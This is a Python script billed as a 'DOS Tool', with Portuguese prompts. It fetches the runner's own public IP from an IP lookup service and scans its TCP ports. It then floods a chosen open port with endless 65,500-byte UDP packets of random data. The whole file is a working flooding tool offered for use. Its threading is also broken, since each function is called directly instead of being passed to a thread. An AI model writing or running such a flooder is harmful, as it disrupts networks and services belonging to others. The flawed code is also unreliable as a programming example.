import os
import sys
import socket
import random
import shutil
import requests
import threading
import time
import colorama
from colorama import Fore
colorama.init(autoreset=True)


target = requests.get('https://api.ipify.org/').text
bytes = 65500
list = []

class DOS():
    def get_port(self, list):
        for porta in range(1, 65535):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            resultado = s.connect_ex((target, porta))
            s.close()
            if resultado == 0:
                if porta in list:
                    pass
                else:
                    global port
                    port = porta
                    os.system('cls')
                    print(f'{Fore.GREEN}[+] Porta aberta - {porta}{Fore.RESET}')
                    break
            else:
                print(f'{Fore.RED}[-] Porta fechada - {porta}{Fore.RESET}')
    def attack(self, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sent = 0
        while True:
            sock.sendto(random._urandom(bytes), (target, port))
            print(f'{sent} Pacotes | {bytes} bytes enviados para {target} pela porta {port}')
            sent = sent + 1


os.system('cls')
print(f'''{Fore.CYAN}
########################
# DOS Tool - By Neonny #
########################
{Fore.RESET}''')
y_n = input('Deseja rodar o programa[Y/n]? ')
if y_n == 'y' or y_n == 'Y':
    os.system('cls')
    print('[+] Iniciando o programa...')
    time.sleep(1)
    while True:
        os.system('cls')
        threading.Thread(target=DOS().get_port(list=list)).start()
        time.sleep(0.5)
        os.system('cls')
        y = input(f'A porta {port} está abertá deseja usar esta porta?[Y/n] ')
        if y == 'y' or y == 'Y':
            os.system('cls')
            threading.Thread(target=DOS().attack(port=port)).start()
        else:
            list.append(port)
            continue
else:
    os.system('cls')
    print('[-] Fechando o programa.')